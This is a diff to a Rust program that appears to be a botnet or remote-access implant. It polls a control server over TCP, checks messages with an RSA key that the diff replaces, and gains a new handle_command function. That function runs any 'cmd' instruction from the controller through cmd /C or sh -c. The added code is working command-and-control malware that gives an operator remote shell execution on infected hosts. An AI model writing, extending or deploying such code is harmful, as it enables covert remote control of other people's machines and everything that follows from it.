@@ -1,4 +1,5 @@
 use tokio::net::{TcpStream};
+use std::process::Command;
 use rsa::signature::Verifier;
 use std::error::Error;
 use tokio::time::{Duration, sleep};
@@ -11,12 +12,12 @@ use rsa::sha2::{Digest, Sha256};
 
 const CONTROL: &str = "127.0.0.1:8080";
 const RSA_PUB_PEM: &str = "-----BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEA3Q4YyAa124SngD/gET8G+2y5tECs0DID/M2TftoLPcnKlfpiZOSP
-S2bz9bWA33g0NgE3wGBFtYWevQVMwdU18HR6V5BF1nkmF9JOOHGzcTPXTFHaUKPV
-h13+njkQhuEk8y0wNDSz58mEdHAKL/ckyMFl2o1Z5qrAoGO0+v6stUcD/nrrbdvo
-sfkJmUo3aVQTy2avtX94h8tp1uLp6aFV/5IvegW3FLAYMbDHkCV8VPzwRVl5mSLQ
-IrQKfht+L7Kb7aWTKxcDS+o2oHRIpZWSlE3WvG4xHNp0lhiSJs3i+m0loTquefne
-wanT2eKi+DC7sokMR16nvIyJGz0TGISzNQIDAQAB
+MIIBCgKCAQEA1KBXWBk/GxsfTWhKTSUp7SB/M+cE9vQHVYaeRgtzN4t430JbmUbU
+3bMVusTc5FzE659d7JFpFmEV1jQuuscwarBtG4LTsgRzm/WntGlXLXqCLlr/lka0
+1f5Lc+myAWj+fVGmFJArC20cdo2KEJXVnQnm9VYzUI0yz9Y0lyvBJYCoYqoXmX+Z
+JE6D/VrgZY5XSmeiDUeV5W8+wFUj7VE89B9agzKXjz3K1xUsrz7Q5Ri9XQ+F7ouL
+ghP0P975jWSP2sHbRdtXSei7zb4baGOiOe/7mH1/xUSGmxyHuQlc0haOGUXC7jxT
+2jefOObS8Jry+lGlMMYpWSa5YazWBF+wnwIDAQAB
 -----END RSA PUBLIC KEY-----";
 
 #[tokio::main]
@@ -66,9 +67,14 @@ async fn main() -> Result<(), Box<dyn Error>> {
             continue;
         }
 
-        println!("Message from control: {}", String::from_utf8_lossy(&buf[..]));
+        let command = String::from_utf8(buf).expect("Bad utf8"); // Make this not unwrap, just continue
+        let command = command.trim_matches(char::from(0));
+        println!("Message from control: {}", &command[..]);
+        handle_command(command.to_string()).await;
 
         writer.shutdown().await;
+
+        // Now lets handle our command.
         
         sleep(Duration::from_millis(5000)).await;
     }
@@ -82,5 +88,31 @@ async fn get_stream() -> TcpStream {
                 sleep(Duration::from_millis(5000));
             }
         }
+    }
+}
+
+async fn handle_command(command: String) {
+    let (command, args) = match command.split_once(" ") {
+        Some((c, a)) => (c, a),
+        None => (&command[..], ""),
+    };
+
+    match command {
+        "cmd" => {
+            println!("Command running!");
+            if cfg!(target_os = "windows") {
+                Command::new("cmd")
+                    .args(["/C", args])
+                    .spawn()
+                    .expect("Command err");
+            } else {
+                Command::new("sh")
+                    .arg("-c")
+                    .arg(args)
+                    .spawn()
+                    .expect("Command err");
+            }
+        },
+        &_ => (),
     }
 }
